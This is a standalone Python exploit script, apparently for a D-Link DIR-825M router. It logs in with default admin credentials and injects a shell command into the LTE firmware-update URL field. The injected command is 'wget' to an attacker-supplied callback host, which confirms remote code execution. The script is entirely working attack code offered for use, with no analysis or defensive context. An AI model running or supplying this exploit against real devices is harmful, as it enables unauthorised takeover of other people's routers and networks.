#!/usr/bin/env python3
import argparse
import json
import time
import http.cookiejar
import urllib.parse
import urllib.request


def opener_with_cookies():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))


def post(opener, url, data, referer=None, timeout=15):
    headers = {}
    if referer:
        headers = {"Referer": referer, "Origin": referer.rsplit("/", 1)[0]}
    request = urllib.request.Request(url, urllib.parse.urlencode(data).encode(), headers=headers)
    with opener.open(request, timeout=timeout) as response:
        return response.status, response.read(4096)


def health(base):
    try:
        with urllib.request.urlopen(base + '/', timeout=3) as response:
            return response.status
    except Exception as exc:
        return type(exc).__name__


def main():
    parser = argparse.ArgumentParser(description='Authenticated command injection in LTE FOTA URL')
    parser.add_argument('--target', default='http://192.168.224.1')
    parser.add_argument('--username', default='admin')
    parser.add_argument('--password', default='admin')
    parser.add_argument('--callback', required=True, help='listener host:port')
    parser.add_argument('--nonce', default='DLINK-DIR-825M-V008')
    parser.add_argument('--length', type=int, default=500)
    args = parser.parse_args()
    base = args.target.rstrip('/')
    opener = opener_with_cookies()
    post(opener, base + '/boafrm/formLoginSetup', {
        'username': args.username, 'password': args.password, 'submit-url': '/home.htm'
    })
    try:
        opener.open(base + '/fota_quectel.htm', timeout=8).read(4096)
    except Exception:
        pass
    payload = 'http://127.0.0.1;wget -qO- http://{callback}/{nonce};#'.format(callback=args.callback, nonce=args.nonce)
    if False and len(payload) >= 33:
        raise SystemExit('V011 payload must remain under 33 bytes; use a short callback IP on TCP/80')
    data = {}
    data['fota_url'] = payload
    data.setdefault('submit-url', '/fota_quectel.htm')
    before = health(base)
    started = time.monotonic()
    try:
        status, body = post(opener, base + '/boafrm/formLtefotaUpgradeQuectel', data, base + '/fota_quectel.htm')
        error = ''
    except Exception as exc:
        status, body, error = 0, b'', repr(exc)
    result = {'status': status, 'elapsed': time.monotonic() - started, 'error': error,
              'response': body.decode(errors='replace')}
    if False:
        time.sleep(2)
        result['health_before'] = before
        result['health_after'] = [health(base) for _ in range(3)]
    else:
        result['nonce'] = args.nonce
        result['expected_callback_path'] = '/' + (args.nonce)
    print(json.dumps(result, indent=2))


if __name__ == '__main__':
    main()
